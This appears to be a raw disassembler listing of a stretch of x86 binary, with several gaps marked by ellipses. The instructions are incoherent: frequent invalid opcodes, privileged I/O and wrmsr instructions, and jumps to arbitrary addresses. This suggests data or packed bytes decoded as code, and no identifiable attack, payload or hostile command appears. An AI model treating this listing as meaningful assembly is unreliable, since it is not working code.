  424102:	mov    ah,0x3f
  424104:	cmp    eax,0x9b3c9d6e
  424109:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42410a:	nop
  42410b:	pop    esi
  42410c:	or     BYTE PTR [edi-0x32],0x87
  424110:	add    al,BYTE PTR [eax]
  424112:	jmp    0x424173
  424114:	fcmovb st,st(5)
  424116:	xor    DWORD PTR [edx+0x40d55a8f],edx
  42411c:	arpl   WORD PTR [eax-0x2d60fcbf],dx
  424122:	loop   0x4240ad
  424124:	cmp    eax,0x5e738c6a
  424129:	mov    dl,0x6
  42412b:	outs   dx,BYTE PTR ds:[esi]
  42412c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42412d:	mov    al,0xea
  42412f:	and    BYTE PTR [esi+0x4d],0x32
  424133:	ja     0x42416e
  424135:	jp     0x424181
  424137:	ins    DWORD PTR es:[edi],dx
  424138:	ja     0x4240cf
  42413a:	mov    ds:0xc3c81fd7,al
  42413f:	int3   
  424140:	pop    ecx
  424141:	frstor [ebx+0x3f]
  424144:	ror    bh,1
  424146:	cwde   
  424147:	sbb    bh,ah
  424149:	xchg   DWORD PTR [esi-0x3f12a88d],eax
  42414f:	imul   esi,DWORD PTR [edi+0x47d4c5e8],0x3f4edf2a
  424159:	cmp    BYTE PTR ss:[edi],bl
  42415c:	sar    DWORD PTR [ecx-0x7af2b83b],cl
  424162:	mov    cl,0x3
  424164:	daa    
  424165:	ins    BYTE PTR es:[edi],dx
  424166:	pop    edi
  424167:	ins    DWORD PTR es:[edi],dx
  424168:	rcl    DWORD PTR [edi+ebx*1+0x32],0xa2
  42416d:	stos   DWORD PTR es:[edi],eax
  42416e:	jne    0x42412a
  424170:	cwde   
  424171:	div    BYTE PTR [eax-0x4]
  424174:	loop   0x424144
  424176:	fstp   QWORD PTR [ebx-0x28fa2236]
  42417c:	aas    
  42417d:	call   0xa897dd56
  424182:	out    0x3e,al
  424184:	or     BYTE PTR [eax],bl
  424186:	xor    BYTE PTR [ebp-0x5a],0xad
  42418a:	adc    al,0xe2
  42418c:	push   0xffffffa0
  42418e:	inc    ebx
  42418f:	dec    ebp
  424190:	cmp    esp,DWORD PTR [edi+0x58e277f]
  424196:	jg     0x424145
  424198:	das    
  424199:	dec    ecx
  42419a:	inc    ecx
  42419b:	fcmovnb st,st(2)
  42419d:	pop    esp
  42419e:	(bad)  
  42419f:	fldcw  WORD PTR [edx]
  4241a1:	jecxz  0x424144
  4241a3:	imul   edx,ebp,0x295132ec
  4241a9:	xchg   esp,eax
  4241aa:	jb     0x424149
  4241ac:	lea    esp,[ebx+0xb]
  4241af:	inc    esp
  4241b0:	mov    ch,0x68
  4241b2:	jno    0x4241ca
  4241b4:	jle    0x4241b6
	...
  424216:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42421d:	call   DWORD PTR [edi-0x312b4be9]
  424223:	push   esp
  424224:	xchg   edx,eax
  424225:	push   ds
  424226:	test   al,0x80
  424228:	add    DWORD PTR [eax],eax
  42422a:	pop    es
  42422b:	add    DWORD PTR [eax],eax
  42422d:	add    BYTE PTR [esi],al
  42422f:	ins    DWORD PTR es:[edi],dx
  424230:	and    al,0xba
  424232:	fisttp QWORD PTR [edx+ecx*8]
  424235:	nop
  424236:	sbb    bl,BYTE PTR [eax+ecx*8]
  424239:	ffreep st(7)
  42423b:	mov    edi,0x50191ddb
  424240:	or     edx,DWORD PTR [ebp-0xd]
  424243:	in     al,0xd2
  424245:	aam    0xb8
  424247:	xor    dl,BYTE PTR [eax]
  424249:	call   0x96f8:0xf569336c
  424250:	fdivp  st(5),st
  424252:	cdq    
  424253:	int    0xce
  424255:	pusha  
  424256:	wrmsr  
  424258:	addr16 sbb ch,ah
  42425b:	cwde   
  42425c:	jmp    0x424261
  42425e:	push   esp
  42425f:	push   ss
  424260:	enter  0xf2b7,0xd4
  424264:	ret    
  424265:	push   ss
  424266:	push   edx
  424267:	mov    dh,0x48
  424269:	xlat   BYTE PTR ds:[ebx]
  42426a:	adc    esp,ebp
  42426c:	test   al,0xb8
  42426e:	lea    edi,[ecx]
  424270:	scas   al,BYTE PTR es:[edi]
  424271:	inc    ecx
  424272:	and    al,0xe0
  424274:	inc    ebx
  424275:	aam    0xf3
  424277:	in     eax,dx
  424278:	cwde   
  424279:	adc    BYTE PTR [eax+ecx*8],bh
  42427c:	into   
  42427d:	call   0xcbffb88d
  424282:	mov    dl,0x92
  424284:	push   esi
  424285:	loop   0x42428e
  424287:	sub    ch,BYTE PTR [edx-0x63]
  42428a:	jne    0x42429f
  42428c:	cli    
  42428d:	bound  edx,QWORD PTR [eax-0x6e1444f8]
  424293:	pop    ss
  424294:	xchg   esp,eax
  424295:	xchg   BYTE PTR [ebx],bh
  424297:	mov    WORD PTR [ecx+0x7eb10568],fs
  42429d:	stos   DWORD PTR es:[edi],eax
  42429e:	dec    ebp
  42429f:	dec    eax
  4242a0:	sub    eax,0xe9ab6fd9
  4242a5:	or     DWORD PTR [esi],esp
  4242a7:	lods   eax,DWORD PTR ds:[esi]
  4242a8:	stos   DWORD PTR es:[edi],eax
  4242a9:	repz mov al,0x43
  4242ac:	xchg   ebp,eax
  4242ad:	enter  0x65d5,0xcf
  4242b1:	aaa    
  4242b2:	cmp    eax,0xf8380240
  4242b7:	in     al,dx
  4242b8:	inc    ebx
  4242b9:	jne    0x4242d8
  4242bb:	hlt    
  4242bc:	(bad)  
  4242bd:	lea    esi,[edx-0x19f8f26c]
  4242c3:	int    0x3e
  4242c5:	jg     0x42426c
  4242c7:	popf   
  4242c8:	mov    esi,0xed2a5892
  4242cd:	mov    eax,0x1db78d82
  4242d2:	push   ebx
  4242d3:	test   dl,bh
  4242d5:	outs   dx,DWORD PTR ds:[esi]
  4242d6:	dec    edi
  4242d7:	adc    al,0xf
  4242d9:	jmp    0xa5592f56
  4242de:	sbb    DWORD PTR [ebx],esi
  4242e0:	mov    esp,0xc377aac8
  4242e5:	mov    ds:0xc0ca03b9,al
  4242ea:	popa   
  4242eb:	sub    al,0x56
  4242ed:	retf   
  4242ee:	or     cl,dh
  4242f0:	fdiv   DWORD PTR [edx-0x69c5098c]
  4242f6:	and    edi,DWORD PTR gs:[eax-0x438aff1]
  4242fd:	aam    0x8b
  4242ff:	rcl    DWORD PTR [eax-0x1b01eb92],cl
  424305:	mov    al,ds:0x5d50a969
  42430a:	cmp    al,0xf7
  42430c:	lea    ecx,[esi]
  42430e:	(bad)  
  42430f:	loop   0x424293
  424311:	sub    BYTE PTR [ebx*8-0x194fd2ce],dl
  424318:	mov    WORD PTR [edi],ds
  42431a:	in     eax,dx
  42431b:	scas   al,BYTE PTR es:[edi]
  42431c:	sub    BYTE PTR [esi-0x30ab6f52],0x45
  424323:	pop    ebp
  424324:	leave  
  424325:	out    0xf4,eax
  424327:	mov    al,bl
  424329:	jno    0x424312
  42432b:	out    0xc4,eax
  42432d:	pop    ss
  42432e:	dec    edx
  42432f:	xchg   BYTE PTR [edi],dh
  424331:	ins    DWORD PTR es:[edi],dx
  424332:	push   0xffffff89
  424334:	stos   DWORD PTR es:[edi],eax
	...
  424395:	add    BYTE PTR [edx-0x24582da],cl
  42439b:	sti    
  42439c:	iret   
  42439d:	test   DWORD PTR ss:[ebx],ebx
  4243a0:	sub    edx,ebp
  4243a2:	xlat   BYTE PTR ds:[ebx]
  4243a3:	xchg   esi,eax
  4243a4:	jmp    0x424417
  4243a6:	scas   eax,DWORD PTR es:[edi]
  4243a7:	add    DWORD PTR [ecx],0x10700
  4243ad:	add    BYTE PTR [ecx+0x51dda683],dh
  4243b3:	mov    eax,0x3e2a780f
  4243b8:	dec    ebx
  4243b9:	shr    ecx,0x5e
  4243bc:	fdiv   QWORD PTR [ecx+0x6d]
  4243bf:	shl    eax,0xd2
  4243c2:	xlat   BYTE PTR ds:[ebx]
  4243c3:	jg     0x424361
  4243c5:	xor    dl,BYTE PTR [ebp-0xbeab31]
  4243cb:	fsubr  QWORD PTR [eax]
  4243cd:	ror    DWORD PTR [edi-0x4f],cl
  4243d0:	cmp    DWORD PTR ds:[edi+0x4b61fbfc],ebx
  4243d7:	inc    ecx
  4243d8:	push   0xffffffd5
  4243da:	push   esi
  4243db:	sub    al,0x5b
  4243dd:	cmp    al,0xb
  4243df:	jno    0x42440d
  4243e1:	and    esp,ecx
  4243e3:	add    BYTE PTR [esi+0x26],dl
  4243e6:	or     ebp,esp
  4243e8:	pushf  
  4243e9:	sar    BYTE PTR [edx+ebx*8+0x47],cl
  4243ed:	and    eax,0xedc09383
  4243f2:	jne    0x4243cd
  4243f4:	and    eax,0x7050327d
  4243f9:	retf   
  4243fa:	sti    
  4243fb:	xchg   DWORD PTR [eax+edx*2+0x7c],ebx
  4243ff:	adc    al,0x3d
  424401:	fwait
  424402:	(bad)  
  424403:	clc    
  424404:	xor    eax,0x5cb875f9
  424409:	push   edx
  42440a:	mov    ah,BYTE PTR [eax]
  42440c:	mov    bl,0x6a
  42440e:	aam    0x2d
  424410:	pop    ebp
  424411:	xchg   edx,eax
  424412:	adc    dl,0xa
  424415:	fdivr  QWORD PTR [eax-0x3b13f426]
  42441b:	push   esi
  42441c:	fimul  WORD PTR ds:0x4f56a3f8
  424422:	scas   eax,DWORD PTR es:[edi]
  424423:	sbb    cl,BYTE PTR [eax]
  424425:	sbb    ch,BYTE PTR [edx+0x1d]
  424428:	dec    ecx
  424429:	sub    al,0x80
  42442b:	mov    eax,0x4084733c
  424430:	(bad)  
  424431:	imul   esp,DWORD PTR [ebx-0x43],0xffffffc7
  424435:	imul   ecx,DWORD PTR [esi],0x20db09d4
  42443b:	into   
  42443c:	add    ah,bh
  42443e:	int3   
  42443f:	jmp    0x42440a
  424441:	xchg   esi,eax
  424442:	test   edi,edi
  424444:	leave  
  424445:	imul   eax,eax,0x56
  424448:	lock cwde 
  42444a:	and    eax,0x2f35abfd
  42444f:	outs   dx,DWORD PTR ds:[esi]
  424450:	shr    BYTE PTR [ebx],cl
  424452:	xchg   edi,eax
  424453:	xchg   esp,eax
  424454:	jo     0x4243da
  424456:	mov    BYTE PTR [ebp+0x41],0x1b
  42445a:	dec    esp
  42445b:	push   0x7
  42445d:	leave  
  42445e:	mov    ebx,0x482b5f7a
  424463:	bnd jno 0x4243f1
  424466:	stos   DWORD PTR es:[edi],eax
  424467:	or     al,0x2
  424469:	call   0xbf641bd8
  42446e:	je     0x42444d
  424470:	scas   eax,DWORD PTR es:[edi]
  424471:	and    esi,0xffffff9f
  424474:	fwait
  424475:	sub    eax,0x7792536f
  42447a:	not    ebx
  42447c:	int3   
  42447d:	mov    eax,ds:0xa5f8fde0
  424482:	add    al,0xef
  424484:	mov    edi,0xd68eafa2
  424489:	sar    BYTE PTR [esi+0x6c2831d3],0xdd
  424490:	inc    esp
  424491:	add    DWORD PTR [edi+ecx*4+0x708e88ea],eax
  424498:	aas    
  424499:	jns    0x424420
  42449b:	out    0x90,al
  42449d:	call   0xa6b518ff
  4244a2:	rcr    BYTE PTR [ecx+edi*1],0x56
  4244a6:	cdq    
  4244a7:	push   ecx
  4244a8:	mov    dl,ch
  4244aa:	(bad)  
  4244ac:	nop
  4244ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244ae:	and    edx,DWORD PTR [esp+edi*1+0x6d72f43b]
	...
  424515:	add    al,ah
  424517:	outs   dx,DWORD PTR ds:[esi]
  424518:	xchg   esi,eax
  424519:	inc    edx
  42451a:	lahf   
  42451b:	sti    
  42451c:	hlt    
  42451d:	out    dx,eax
  42451e:	mov    al,ds:0x960ff3ab
  424523:	mov    ah,0x27
  424525:	dec    ecx
  424526:	mov    dh,0x82
  424528:	add    DWORD PTR [eax],eax
  42452a:	pop    es
  42452b:	add    DWORD PTR [eax],eax
  42452d:	add    BYTE PTR [ebx+edx*1+0x49],al
  424531:	adc    al,0xc3
  424533:	ret    
  424534:	popa   
  424535:	jecxz  0x424509
  424537:	aaa    
  424538:	or     BYTE PTR [edx],al
  42453a:	fisttp QWORD PTR [ebp-0x5b]
  42453d:	adc    dh,BYTE PTR [ecx]
  42453f:	inc    ebp
  424540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424541:	pop    edx
  424542:	jne    0x424561
  424544:	loope  0x424563
  424546:	inc    esi
  424547:	push   ss
  424548:	in     eax,0x23
  42454a:	pop    ss
  42454b:	jae    0x42451a
  42454d:	dec    eax
  42454e:	or     al,0x12
  424550:	and    al,0x39
  424552:	push   ss
  424553:	test   eax,eax
  424555:	xor    BYTE PTR [eax],0x4b
  424558:	call   DWORD PTR [edx]
  42455a:	repz pop eax
  42455c:	rcr    eax,cl
  42455e:	pop    eax
  42455f:	cmp    edx,DWORD PTR [esi]
  424561:	pop    edx
  424562:	jle    0x4245ca
  424564:	sub    al,0x64
  424566:	mov    ds:0xe075c8e0,eax
  42456b:	jnp    0x424599
  42456d:	fcomp  DWORD PTR [ebx+eax*4-0x52e9886f]
  424574:	out    0x5e,al
  424576:	xchg   BYTE PTR gs:[esi+0x79546cdc],bl
  42457d:	mov    ecx,0x483f79fe
  424582:	adc    ebx,esp
  424584:	scas   eax,DWORD PTR es:[edi]
  424585:	scas   eax,DWORD PTR es:[edi]
  424586:	fnstenv [edx+0x5cf83476]
  42458c:	shl    BYTE PTR [ebx-0x6e22bc04],1
  424592:	mov    ch,0x9b
  424594:	dec    esp
  424595:	cmp    eax,0x5843e8d
  42459a:	daa    
  42459b:	fwait
  42459c:	sbb    dl,BYTE PTR [esi]
  42459e:	and    esp,DWORD PTR [ebx+0x663a0e98]
  4245a4:	out    0x29,eax
  4245a6:	mov    dh,0x85
  4245a8:	je     0x424551
  4245aa:	test   al,0x71
  4245ac:	sbb    al,0x10
  4245ae:	jb     0x4245c6
  4245b0:	out    dx,eax
  4245b1:	pop    edx
  4245b2:	(bad)  
  4245b3:	ds pop ebx
  4245b5:	ret    
  4245b6:	add    esi,DWORD PTR [ebp+0x4f6674ab]
  4245bc:	int    0x83
  4245be:	push   edi
  4245bf:	(bad)  [esi+0xb219b3f]
  4245c5:	add    BYTE PTR ds:0x4231a36f,dh
  4245cb:	retf   
  4245cc:	fdivr  QWORD PTR [edi]
  4245ce:	mov    eax,ds:0x72b31343
  4245d3:	inc    edx
  4245d4:	out    dx,eax
  4245d5:	lods   eax,DWORD PTR ds:[esi]
  4245d6:	adc    BYTE PTR [esi+0x185ffcaf],0xa8
  4245dd:	mov    edx,0xb438c73f
  4245e2:	das    
  4245e3:	add    al,0x4e
  4245e5:	test   BYTE PTR [eax+0xa],dh
  4245e8:	jno    0x42456a
  4245ea:	and    DWORD PTR [edi+0x6],esp
  4245ed:	bound  ebp,QWORD PTR [ebx+0x2ee7a01e]
  4245f3:	test   DWORD PTR ds:[edi-0x57],eax
  4245f7:	mov    eax,0x91284747
  4245fc:	setbe  BYTE PTR [esi-0x6c]
  424600:	xchg   ebx,eax
  424601:	aas    
  424602:	cld    
  424603:	imul   edi,DWORD PTR [edi-0x101fa5a2],0x35a86af9
  42460d:	inc    esi
  42460e:	fs pop es
  424610:	int    0x7c
  424612:	loopne 0x424599
  424614:	and    ah,dl
  424616:	rcl    DWORD PTR [edx-0x35],0xcd
  42461a:	mov    eax,ds:0x1fe4af43
  42461f:	in     eax,dx
  424620:	fnstsw WORD PTR [edi-0x2a]
  424623:	retf   
  424624:	push   0xb97287dd
  424629:	cdq    
  42462a:	dec    eax
  42462b:	dec    esi
  42462c:	test   al,0x6b
  42462e:	test   DWORD PTR [si+0x51f2],0x44e5
	...
  424693:	add    BYTE PTR [eax],al
  424695:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42469c:	mov    edi,0x8f38d4d3
  4246a1:	cmp    edi,ebp
  4246a3:	jb     0x424716
  4246a5:	mov    al,ds:0x183bd
  4246aa:	pop    es
  4246ab:	add    DWORD PTR [eax],eax
  4246ad:	add    BYTE PTR [edi-0x63238751],dh
  4246b3:	(bad)  
  4246b5:	xchg   esp,eax
  4246b6:	jne    0x4246ae
  4246b8:	out    dx,al
  4246b9:	jae    0x4246e2
  4246bb:	pop    eax
  4246bc:	jle    0x4246b7
  4246be:	repnz xchg ebx,eax
  4246c0:	cdq    
  4246c1:	dec    edx
  4246c2:	call   0x9998a614
  4246c7:	and    esi,DWORD PTR [esi]
  4246c9:	mov    esp,0x6f61847
  4246ce:	aam    0xb1
  4246d0:	and    al,0xdd
  4246d2:	push   ebp
  4246d3:	mov    eax,ds:0x9b62e278
  4246d8:	jmp    0x99b8:0x93a506ed
  4246df:	fild   DWORD PTR [ecx+0x23ed0924]
  4246e5:	sbb    edi,DWORD PTR [edi-0x29]
  4246e8:	and    al,0x3b
  4246ea:	jne    0x42468d
  4246ec:	and    eax,0x21838d48
  4246f1:	stos   BYTE PTR es:[edi],al
  4246f2:	xchg   BYTE PTR [edx-0x6081cf7c],ch
  4246f8:	pop    esp
  4246f9:	repnz mov ?,WORD PTR [eax]
  4246fc:	hlt    
  4246fd:	lods   al,BYTE PTR ds:[esi]
  4246fe:	imul   ecx,DWORD PTR [ecx+esi*4-0x2],0x4a
  424703:	pop    edi
  424704:	enter  0x4ff6,0xc
  424708:	xchg   BYTE PTR [ecx-0x4a],ch
  42470b:	sub    al,0x3
  42470d:	sbb    al,0x71
  42470f:	push   ebx
  424710:	fiadd  DWORD PTR [edx-0x7eac5924]
  424716:	jno    0x42470e
  424718:	push   ss
  424719:	data16 mov WORD PTR [eax+0x69],ds
  42471d:	in     eax,dx
  42471e:	dec    ecx
  42471f:	mov    ds:0xa234cf5d,eax
  424724:	cdq    
  424725:	pop    esp
  424726:	shr    DWORD PTR ds:0xc0d06c21,1
  42472c:	mov    esp,DWORD PTR [ebx]
  42472e:	sbb    eax,0xa39b38db
  424733:	cli    
  424734:	int3   
  424735:	out    dx,al
  424736:	jne    0x424752
  424738:	xchg   BYTE PTR [ebx+0x6314f609],al
  42473e:	push   0xffffff8c
  424740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424741:	jl     0x4247a2
  424743:	push   ecx
  424744:	or     ebp,DWORD PTR [ebp-0x7c]
  424747:	mov    cl,0x9f
  424749:	in     al,dx
  42474a:	jge    0x42474a
  42474c:	push   esp
  42474d:	mov    eax,ds:0x5b9d3e45
  424752:	inc    ecx
  424753:	or     ecx,DWORD PTR [esi-0x41]
  424756:	dec    esi
  424757:	or     esp,ecx
  424759:	js     0x424704
  42475b:	and    al,0x3e
  42475d:	push   es
  42475e:	dec    esi
  42475f:	add    eax,0x853e66cf
  424764:	pop    ebp
  424765:	js     0x424733
  424767:	xchg   ebx,eax
  424768:	xor    ebp,DWORD PTR [eax-0x35fe9397]
  42476e:	jb     0x4247af
  424770:	xor    eax,0xcc09df0e
  424775:	retf   0xe114
  424778:	iret   
  424779:	jbe    0x42474d
  42477b:	jmp    0xf7072465
  424780:	xchg   ebp,eax
  424781:	ret    0xdea6
  424784:	nop
  424785:	test   eax,0x35626c9
  42478a:	dec    esi
  42478b:	stos   BYTE PTR es:[edi],al
  42478c:	xchg   edi,eax
  42478d:	inc    ecx
  42478e:	jle    0x42471c
  424790:	add    al,0x40
  424792:	jl     0x424756
  424794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424795:	adc    DWORD PTR [edx],esi
  424797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424798:	or     al,0xaf
  42479a:	inc    edx
  42479b:	push   es
  42479c:	je     0x424729
  42479e:	or     eax,0xa9e2e48e
  4247a3:	into   
  4247a4:	in     al,0x77
  4247a6:	outs   dx,BYTE PTR ds:[si]
  4247a8:	add    edx,DWORD PTR [ebx+0x4f306916]
  4247ae:	call   0xf84:0xad35d36d
	...
  424815:	add    BYTE PTR [edx],ah
  424817:	pop    eax
  424818:	test   bh,ch
  42481a:	(bad)  
  42481b:	jmp    FWORD PTR [ebx-0x23]
  42481e:	rol    DWORD PTR [eax+0x2fb4f822],0x0
  424825:	repnz les eax,FWORD PTR [ecx+eax*1+0x10700]
  42482d:	add    BYTE PTR [ecx+0x752d034b],cl
  424833:	jae    0x424898
  424835:	sbb    ch,cl
  424837:	fiadd  WORD PTR [edi+0xa6ae454]
  42483d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42483e:	pop    ecx
  42483f:	sbb    BYTE PTR [ebx-0x7787ca67],ah
  424845:	pop    esp
  424846:	sub    BYTE PTR [edx+ebx*2+0x1de29c9f],cl
  42484d:	dec    eax
  42484e:	jge    0x4248b0
  424850:	pop    esi
  424851:	repz or al,0x92
  424854:	push   ebx
  424855:	push   ds
  424856:	push   esi
  424857:	sbb    ah,BYTE PTR [ecx+0x22d38f53]
  42485d:	rcl    BYTE PTR ds:[ecx+edi*2+0x67],0x32
  424863:	and    al,0xc1
  424865:	fs (bad) 
  424867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424868:	dec    edx
  424869:	inc    ebp
  42486a:	loopne 0x4248c8
  42486c:	dec    eax
  42486d:	push   edx
  42486e:	test   DWORD PTR [edx-0x6bfe4666],ecx
  424874:	dec    esi
  424875:	mov    bl,0x70
  424877:	mov    dl,BYTE PTR [eax+0x330be531]
  42487d:	(bad)
  424882:	cs dec ebx
  424884:	fimul  WORD PTR [ebp-0x6c]
  424887:	mov    al,ds:0x25e65e4f
  42488c:	adc    eax,0xf9120aae
  424891:	jecxz  0x4248bb
  424893:	into   
  424894:	xchg   ebp,eax
  424895:	in     al,dx
  424896:	jmp    0x424883
  424898:	aaa    
  424899:	imul   edx,DWORD PTR [edx+0xf],0x5
  42489d:	mov    ecx,0x7707dec3
  4248a2:	push   edi
  4248a3:	mov    bl,0x16
  4248a5:	mov    dl,0x47
  4248a7:	gs (bad) 
  4248aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248ab:	loope  0x42483b
  4248ad:	call   0xf8dd:0xd9d1d87f
  4248b4:	cmp    DWORD PTR [eax+0x45],ecx
  4248b7:	es add esi,ecx
  4248ba:	push   0x2a16bc0a
  4248bf:	sub    eax,0x52e3a51a
  4248c4:	aad    0x2a
  4248c6:	into   
  4248c7:	test   al,0x9a
  4248c9:	mov    dl,0xb
  4248cb:	test   al,0x79
  4248cd:	dec    edi
  4248ce:	adc    BYTE PTR [ebx-0x55e225f6],0x1c
  4248d5:	push   0xe825f285
  4248da:	(bad)  
  4248db:	jecxz  0x424888
  4248dd:	pop    ebp
  4248de:	mov    esi,0x581c014a
  4248e3:	into   
  4248e4:	nop
  4248e5:	xor    esp,0xffffffda
  4248e8:	jmp    0x3948:0x23e2277c
  4248ef:	out    dx,eax
  4248f0:	ss jg  0x42487c
  4248f3:	int3   
  4248f4:	lods   al,BYTE PTR ds:[esi]
  4248f5:	inc    ebx
  4248f6:	inc    edi
  4248f7:	mov    ch,0x54
  4248f9:	pop    ebx
  4248fa:	jle    0x42496d
  4248fc:	ja     0x42494f
  4248fe:	lods   al,BYTE PTR ds:[esi]
  4248ff:	(bad)  
  424900:	xor    bh,BYTE PTR [ebx+esi*8-0x67]
  424904:	jg     0x42494e
  424906:	int    0x36
  424908:	mov    dl,0xc3
  42490a:	into   
  42490b:	xchg   ebx,eax
  42490c:	dec    edx
  42490d:	mov    dl,0xf2
  42490f:	add    al,0x9f
  424911:	xor    eax,0xafee9e88
  424916:	sbb    eax,0x3c3554b7
  42491b:	sti    
  42491c:	outs   dx,DWORD PTR ds:[esi]
  42491d:	add    al,0x7f
  42491f:	(bad)  
  424920:	xchg   ebp,eax
  424921:	add    DWORD PTR [ebp-0x15],esi
  424924:	outs   dx,BYTE PTR ds:[esi]
  424925:	ret    
  424926:	cmp    al,0x43
  424928:	sub    dl,BYTE PTR [ebp+0x38923850]
  42492e:	adc    cl,ch
  424930:	pop    ss
  424931:	add    ecx,DWORD PTR [edx+0x1c01]
	...
  424993:	add    BYTE PTR [eax],al
  424995:	add    BYTE PTR [ebx+0x18],ch
  424998:	arpl   WORD PTR [edx+0x73],bp
  42499b:	jnp    0x424a08
  42499d:	sbb    ebp,eax
  42499f:	adc    eax,0x33aabac2
  4249a4:	push   esi
  4249a5:	or     ecx,ebx
  4249a7:	test   DWORD PTR [ecx],eax
  4249a9:	add    BYTE PTR [edi],al
  4249ab:	add    DWORD PTR [eax],eax
  4249ad:	add    bh,al
  4249af:	je     0x4249db
  4249b1:	retf   0x8517
  4249b4:	retf   0x6fbd
  4249b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249b8:	mov    esi,0xa59199bf
  4249bd:	xchg   esp,eax
  4249be:	hlt    
  4249bf:	dec    esp
  4249c0:	or     bh,BYTE PTR [edx-0x80]
  4249c3:	pop    eax
  4249c4:	repnz mov dl,0xb
  4249c7:	dec    edx
  4249c8:	nop
  4249c9:	es stc 
  4249cb:	cmc    
  4249cc:	sub    ah,BYTE PTR [edx]
  4249ce:	mov    eax,0x6ffaeb5b
  4249d3:	imul   edx,DWORD PTR [edx+0x74027032],0x8b4aa5c3
  4249dd:	push   esi
  4249de:	push   0x1fa18606
  4249e3:	(bad)  
  4249e4:	cdq    
  4249e5:	or     al,0xdc
  4249e7:	and    BYTE PTR [ebp-0x73],bh
  4249ea:	push   eax
  4249eb:	dec    esp
  4249ec:	adc    BYTE PTR [edx],al
  4249ee:	mov    al,0xb8
  4249f0:	and    eax,0x692467bd
  4249f5:	push   es
  4249f6:	adc    BYTE PTR [ebx],0xd3
  4249f9:	inc    esp
  4249fa:	pop    esp
  4249fb:	sub    ah,BYTE PTR [eax+0x50]
  4249fe:	sahf   
  4249ff:	cmp    ecx,DWORD PTR [ebp-0x61]
  424a02:	pop    ebp
  424a03:	(bad)  [esi-0x49076245]
  424a09:	mov    esp,0xd55f9fec
  424a0e:	xor    ecx,DWORD PTR [ebx-0xc907062]
  424a14:	arpl   ax,dx
  424a16:	jnp    0x424a87
  424a18:	push   eax
  424a19:	push   edi
  424a1a:	inc    eax
  424a1b:	mov    bh,0x26
  424a1d:	inc    BYTE PTR [ebx]
  424a1f:	inc    ebx
  424a20:	fstp   st(1)
  424a22:	sbb    ebx,DWORD PTR [edx+0x4d2d3b6b]
  424a28:	cli    
  424a29:	shr    ch,0x45
  424a2c:	inc    ecx
  424a2d:	jo     0x424a5f
  424a2f:	mov    cl,ah
  424a31:	in     al,0xf5
  424a33:	ins    DWORD PTR es:[edi],dx
  424a34:	cmp    al,0xc7
  424a36:	out    dx,eax
  424a37:	or     DWORD PTR [edx],ebp
  424a39:	xchg   cl,ch
  424a3b:	dec    edx
  424a3c:	cmp    eax,0x1d3e6e7e
  424a41:	hlt    
  424a42:	jle    0x4249e3
  424a44:	in     eax,dx
  424a45:	out    0xed,eax
  424a47:	std    
  424a48:	stos   BYTE PTR es:[edi],al
  424a49:	cdq    
  424a4a:	lods   eax,DWORD PTR ds:[esi]
  424a4b:	inc    ebx
  424a4c:	jbe    0x424a37
  424a4e:	loope  0x424a6a
  424a50:	ds retf 
  424a52:	mov    eax,ds:0x54b01f72
  424a57:	pop    eax
  424a58:	jns    0x424a8d
  424a5a:	push   ss
  424a5b:	push   0x26
  424a5d:	dec    ebp
  424a5e:	mov    bh,0x38
  424a60:	cmp    eax,0x64108273
  424a65:	sbb    al,0x14
  424a67:	(bad)  
  424a68:	and    DWORD PTR [edi+ebp*1+0x21438d5f],ebx
  424a6f:	(bad)  
  424a70:	mov    bh,0xcc
  424a72:	push   edi
  424a73:	ds mov cl,0x4c
  424a76:	mov    ebp,DWORD PTR [edx+0x3a]
  424a79:	xor    edx,ebx
  424a7b:	mov    DWORD PTR [edx],edx
  424a7d:	fild   WORD PTR [esi+0x5bf81395]
  424a83:	and    ebx,DWORD PTR [edi+0x4b236a8a]
  424a89:	sub    edi,esp
  424a8b:	test   DWORD PTR [ecx-0x54],ebx
  424a8e:	sbb    ch,BYTE PTR [edx-0x68]
  424a91:	outs   dx,BYTE PTR ds:[esi]
  424a92:	sbb    BYTE PTR [edx],dh
  424a94:	or     DWORD PTR [ecx-0x1e75e84b],0xffffffe3
  424a9b:	xchg   ebx,eax
  424a9c:	pop    ebp
  424a9d:	adc    DWORD PTR [ebx],esp
  424a9f:	fwait
  424aa0:	jl     0x424a55
  424aa2:	mov    esp,0xfd280a5
  424aa7:	cmp    DWORD PTR [edi],0x2a
  424aaa:	into   
  424aab:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  424aad:	and    BYTE PTR [edi-0x6d],al
  424ab0:	pusha  
  424ab1:	add    eax,0xf4dbf
	...
  424b16:	push   es
  424b17:	aas    
  424b18:	or     eax,0xb6bb3db9
  424b1d:	mov    edi,0x1cbed53b
  424b22:	out    0xa4,eax
  424b24:	mov    dl,0xd7
  424b26:	rol    BYTE PTR [esi+0x1070001],cl
  424b2c:	add    BYTE PTR [eax],al
  424b2e:	dec    esp
  424b2f:	jmp    0xe896:0x92b24259
  424b36:	push   esi
  424b37:	das    
  424b38:	adc    dl,bl
  424b3a:	push   es
  424b3b:	popa   
  424b3c:	jnp    0x424ace
  424b3e:	fdiv   QWORD PTR [ebx]
  424b40:	inc    eax
  424b41:	sar    DWORD PTR [ecx+0x68],0xc2
  424b45:	dec    esp
  424b46:	pop    ds
  424b47:	int    0x3d
  424b49:	and    ebx,0x3e4a2b22
  424b4f:	ins    BYTE PTR es:[edi],dx
  424b50:	daa    
  424b51:	les    ecx,FWORD PTR [ecx]
  424b53:	mov    edx,0xde38211a
  424b58:	mov    DWORD PTR [esi+0x6c],ebx
  424b5b:	hlt    
  424b5c:	(bad)  
  424b5d:	jecxz  0x424bdc
  424b5f:	xor    edx,DWORD PTR [eax+0x6c]
  424b62:	repnz (bad) 
  424b64:	in     al,0x57
  424b66:	mov    DWORD PTR [eax],eax
  424b68:	cld    
